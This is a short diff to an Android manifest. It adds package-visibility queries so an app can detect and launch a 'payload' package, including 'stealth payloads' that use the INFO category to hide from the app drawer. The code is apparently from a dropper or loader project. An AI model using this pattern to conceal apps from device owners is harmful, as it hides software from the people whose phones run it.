@@ -7,12 +7,18 @@
 
     <!-- Android 11+ package visibility: without this, getPackageInfo /
          getLaunchIntentForPackage return "not found" / null even if the
-         payload is installed. The package name is injected at build time. -->
+         payload is installed. The package name is injected at build time.
+         CATEGORY_INFO is included so stealth payloads (which use INFO instead
+         of LAUNCHER to hide from the app drawer) can still be queried. -->
     <queries>
         <package android:name="${payloadPackage}"/>
         <intent>
             <action android:name="android.intent.action.MAIN"/>
             <category android:name="android.intent.category.LAUNCHER"/>
+        </intent>
+        <intent>
+            <action android:name="android.intent.action.MAIN"/>
+            <category android:name="android.intent.category.INFO"/>
         </intent>
     </queries>
 
